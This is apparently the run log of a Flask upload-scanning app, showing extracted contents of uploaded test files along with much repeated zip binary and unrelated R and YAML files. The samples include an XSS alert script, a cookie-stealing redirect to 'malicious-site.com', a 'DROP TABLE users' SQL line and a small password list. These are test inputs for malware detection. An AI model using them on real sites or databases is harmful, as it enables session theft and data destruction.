2025-02-22 21:02:09,851 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,852 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,853 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,854 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,855 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,856 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,857 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:02:09,858 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:02:09,859 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:02:09,860 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:02:09,861 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,862 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,863 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,864 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:02:09,868 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:02:09,868 - [33mPress CTRL+C to quit[0m
2025-02-22 21:02:15,016 - 127.0.0.1 - - [22/Feb/2025 21:02:15] "GET / HTTP/1.1" 200 -
2025-02-22 21:02:22,216 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:02:22,220 - 127.0.0.1 - - [22/Feb/2025 21:02:22] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:02:22,226 - 127.0.0.1 - - [22/Feb/2025 21:02:22] "GET / HTTP/1.1" 200 -
2025-02-22 21:02:40,490 - Extracted content from uploads/flask_file_upload.zip: PK     VZ               flask_file_upload/UT
 gggux     PK   VZ        
  &   flask_file_upload/metadata_analysis.pyUT
 
g
g
gux     VMk0PՋRAܺB0Z{(-!.;ZډB顾X=͌}:~*[)
MڻZ@ jhLz^TԬ4ŎuϦh4b-#W<
HT:tBh#|kƘŢ,0e)Qf!I+~Z0޳+-7Ǫ){&dif;5.k8tXl|tS#|d=Anp*=0#ء7_dQ1.&0n13NPqM*5&{cpcdI,utʁs?.DPoںyM7?N7ݐ6ۍ=8x^A7j5'`ֹ/_=;DZX<<C3	/;
]8t1B!l*-q6(6ۧPBZ4ֻRr	LoL۔l@ڔeJHIFVq7>ަE.:""p'_)Opλ9	w!ao8"`|/;﹊?2po!<3(<od
yTMwBCWD(؉<Nd,RǠ
2025-02-22 21:02:40,670 - 127.0.0.1 - - [22/Feb/2025 21:02:40] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:02:40,676 - 127.0.0.1 - - [22/Feb/2025 21:02:40] "GET / HTTP/1.1" 200 -
2025-02-22 21:02:47,486 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 21:02:47,486 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 21:02:47,487 - 127.0.0.1 - - [22/Feb/2025 21:02:47] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:02:47,492 - 127.0.0.1 - - [22/Feb/2025 21:02:47] "GET / HTTP/1.1" 200 -
2025-02-22 21:02:52,610 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:02:52,614 - 127.0.0.1 - - [22/Feb/2025 21:02:52] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:02:52,620 - 127.0.0.1 - - [22/Feb/2025 21:02:52] "GET / HTTP/1.1" 200 -
2025-02-22 21:04:49,700 - Extracted content from uploads/flask_file_upload_2.zip: PK     șVZ               flask_file_upload/UT
 ԹgԹgԹgux     PK   VZ        /  *   flask_file_upload/create_malicious_xlsx.pyUT
 qԹgԹgԹgux     }RJ0}W\CZA|P0]Ň
e|YzaiRtI[MyJ=prɵ*@(]#ޔެA90⪠3*ji6 w.ࡅ{ƇJ~hen|"j^'YžXnF8 SjiTLI#ʫۖ?2p	9TtwI'4+$wh._ur?椉[*"b>XdeHNǠ?W̰PVjgiWڎz;s2jYILXTQRjm95<m
*TIV:
Ӽt2	#XS7'Z-DOVKͥ#1 xQd+!vIQ<3,û8PK  /  PK   VZ        '  &   flask_file_upload/metadata_analysis.pyUT
 z¹g¹gz¹gux     UQO0~ϯ8
2025-02-22 21:04:50,473 - Extracted content from uploads/flask_file_upload.zip: PK     VZ               flask_file_upload/UT
 gggux     PK   VZ        
  &   flask_file_upload/metadata_analysis.pyUT
 
g
g
gux     VMk0PՋRAܺB0Z{(-!.;ZډB顾X=͌}:~*[)
MڻZ@ jhLz^TԬ4ŎuϦh4b-#W<
HT:tBh#|kƘŢ,0e)Qf!I+~Z0޳+-7Ǫ){&dif;5.k8tXl|tS#|d=Anp*=0#ء7_dQ1.&0n13NPqM*5&{cpcdI,utʁs?.DPoںyM7?N7ݐ6ۍ=8x^A7j5'`ֹ/_=;DZX<<C3	/;
]8t1B!l*-q6(6ۧPBZ4ֻRr	LoL۔l@ڔeJHIFVq7>ަE.:""p'_)Opλ9	w!ao8"`|/;﹊?2po!<3(<od
yTMwBCWD(؉<Nd,RǠ
2025-02-22 21:04:50,653 - Extracted content from uploads/test.zip: PK     mVZ               test/UT
 ǹg#gǹgux     PK   kVZ        5   	   test/3.pyUT
 sgggux     -/*Q//+,.IP*U-JSWTPPVpIKO-/-VHMK PKt"7   5   PK   VZ        "   
   test/5.txtUT
 gggux     +H,../J,.+(JL342*,O-* PKW؂=$   "   PK   ZVZ        9   
   test/1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   VZ        #   
   test/2.xssUT
 g찹ggux     )N.,(KI-*PHLNMQT״чp PK=`4    #   PK   qVZ        >   
2025-02-22 21:04:50,655 - Extracted content from uploads/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,659 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,660 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,662 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,663 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,664 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,665 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,668 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,669 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,671 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,672 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,674 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,675 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,678 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,680 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,682 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,683 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,684 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,687 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,689 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,690 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,692 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,695 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,697 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,698 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,699 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,700 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,701 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,702 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,703 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,705 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,706 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,707 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,708 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,709 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,710 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,712 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,713 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,714 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 21:04:50,715 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,716 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 21:04:50,717 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,719 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,720 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,721 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,722 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,723 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 21:04:50,724 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 21:04:50,726 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 21:04:50,728 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 21:04:50,729 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,730 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 21:04:50,731 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 21:04:50,732 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 21:04:50,733 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 21:04:50,735 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 21:04:50,736 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

